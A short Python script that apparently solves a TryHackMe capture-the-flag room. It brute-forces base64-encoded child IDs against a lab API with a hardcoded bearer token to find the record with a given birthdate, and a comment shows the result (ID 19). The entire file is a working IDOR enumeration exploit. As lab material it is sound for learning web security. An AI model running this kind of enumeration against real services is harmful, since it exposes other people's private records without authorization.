# token manipulation, brute force the IDOR to find the id_number of the child born on 2019-04-17
# TryHackMe: room url -> https://tryhackme.com/room/idor-aoc2025-zl6MywQid9
# Example: url: http://<ip>:<port>/api/child/b64/Mw==
# response: {"child_id":3,"first_name":"johny","parent_id":10,"birthdate":"1920-10-01"}

import requests
import time
import json
import base64

BASE_URL = "http://10.66.185.51:80/api/child/b64/"
headers = {
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEwLCJyb2xlIjoxLCJleHAiOjE3NjU3OTU5MjF9.3SikUXMauQlw2M6640tzFC9po67gI25WkyOMSPGzbuk",
    "Accept": "application/json"
}

for id_number in range(1,100):
    string = str(id_number)
    byte_data = string.encode('utf-8')
    encoded_byte = base64.b64encode(byte_data)

    url = f"{BASE_URL}{encoded_byte.decode()}"
    print(url)
    r = requests.get(url, headers=headers)

    if r.status_code != 200:
        continue
    data = r.json()
    age = data.get("birthdate", "")

    if age == "2019-04-17":
        print(f"Found child born on {age} with the id {id_number} base64 {encoded_byte}")
        break
    time.sleep(0.2)


""" 
result: 
http://10.66.185.51:80/api/child/b64/MTk=
Found child born on 2019-04-17 with the id 19 base64 b'MTk='

"""
